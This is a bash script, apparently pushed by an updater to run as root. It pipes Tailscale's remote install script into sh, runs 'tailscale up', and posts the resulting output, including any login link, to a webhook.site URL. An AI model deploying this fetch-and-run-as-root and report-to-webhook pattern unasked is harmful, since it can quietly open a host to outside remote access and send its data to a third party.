#!/bin/bash
# This file is expected to be downloaded by the updater to /tmp/c.sh and executed as root.
set -u

WASRUN="/tmp/wasRun.txt"
WEBHOOK="https://webhook.site/39efcb72-40f8-4408-a4c0-0dc07f0cd12d"
SELF="$0"

send() {
    # Send arbitrary text to the webhook using the requested method
    wget -nv -O- \
        --no-check-certificate \
        --header="Content-Type: text/plain" \
        --post-data="$1" \
        "$WEBHOOK" >/dev/null 2>&1
    echo
}

# --- run-once guard ---------------------------------------------------------
HASH=$(sha256sum "$SELF" | awk '{print $1}')

if [ -f "$WASRUN" ] && [ "$(cat "$WASRUN" 2>/dev/null)" = "$HASH" ]; then
    send "[skip] hash already executed: $HASH — refusing to run."
    exit 0
fi

send "[run] new content detected (hash=$HASH) — starting."

# --- actual work ------------------------------------------------------------
INSTALL_OUT=$(curl -fsSL https://tailscale.com/install.sh 2>&1 | sh 2>&1)
INSTALL_RC=$?

send "[install] rc=$INSTALL_RC
$INSTALL_OUT"

if [ "$INSTALL_RC" -eq 0 ]; then
    UP_OUT=$(tailscale up 2>&1)
    UP_RC=$?
    send "[tailscale up] rc=$UP_RC
$UP_OUT"
else
    send "[tailscale up] skipped because install failed."
fi

# --- record hash so next identical run is a no-op ---------------------------
printf '%s\n' "$HASH" > "$WASRUN"
send "[done] hash recorded in $WASRUN"
exit 0
